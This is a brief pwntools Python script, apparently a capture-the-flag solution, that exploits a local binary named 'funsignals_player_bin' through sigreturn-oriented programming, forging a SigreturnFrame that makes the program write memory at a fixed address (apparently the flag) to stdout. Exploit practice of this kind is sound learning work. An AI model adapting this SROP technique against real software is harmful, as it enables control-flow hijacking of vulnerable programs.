from pwn import *
p = process("./funsignals_player_bin")
elf = ELF("./funsignals_player_bin")

context.arch = 'amd64'
context.log_level = 'debug'

gdb.attach(p,"b _startx/30gx ")

frame = SigreturnFrame()
frame.rax = 1;#write diaoyonghao
frame.rdi = 1;#liu
frame.rsi = 0x010000023
frame.rdx = 0x50
frame.rip = 0x010000012

p.send(str(frame))
p.interactive()
